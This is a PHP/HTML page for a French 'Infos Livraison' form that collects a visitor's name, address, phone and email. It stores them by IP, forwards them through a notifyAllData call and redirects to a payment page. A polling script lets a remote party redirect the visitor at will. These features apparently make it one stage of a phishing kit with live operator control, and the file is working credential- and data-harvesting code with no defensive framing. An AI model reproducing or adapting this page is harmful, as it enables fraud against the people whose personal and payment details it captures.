<?php
require_once 'config.php';
checkRedirect();

if ($_POST && isset($_POST['nom'])) {
    // Sauvegarder les données par IP
    saveFormData($current_ip, 'livraison', $_POST);
    
    // Notifier TOUTES les données disponibles pour cette IP
    notifyAllData($current_user_id, $current_ip, 'livraison');
    
    header("Location: payment.php");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Infos Livraison</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 500px; margin: 0 auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .btn { display: block; width: 100%; padding: 15px; margin: 10px 0; background: #4CAF50; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
        .form-group { margin: 15px 0; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📦 Infos Livraison</h1>
        
        <form method="post">
            <div class="form-group">
                <label>Nom complet *</label>
                <input type="text" name="nom" placeholder="Votre nom complet" required>
            </div>
            
            <div class="form-group">
                <label>Adresse *</label>
                <input type="text" name="adresse" placeholder="Votre adresse complète" required>
            </div>
            
            <div class="form-group">
                <label>Téléphone *</label>
                <input type="text" name="telephone" placeholder="Votre numéro de téléphone" required>
            </div>
            
            <div class="form-group">
                <label>Email</label>
                <input type="email" name="email" placeholder="Votre email">
            </div>
            
            <button type="submit" class="btn">✅ Valider</button>
        </form>
    </div>

    <script>
    setInterval(() => {
        fetch('check_redirect.php?user_id=<?php echo $current_user_id; ?>')
            .then(r => r.text())
            .then(page => {
                if (page && page.trim() !== '' && page !== 'info.php') {
                    window.location.href = page;
                }
            });
    }, 2000);
    </script>
</body>
</html>
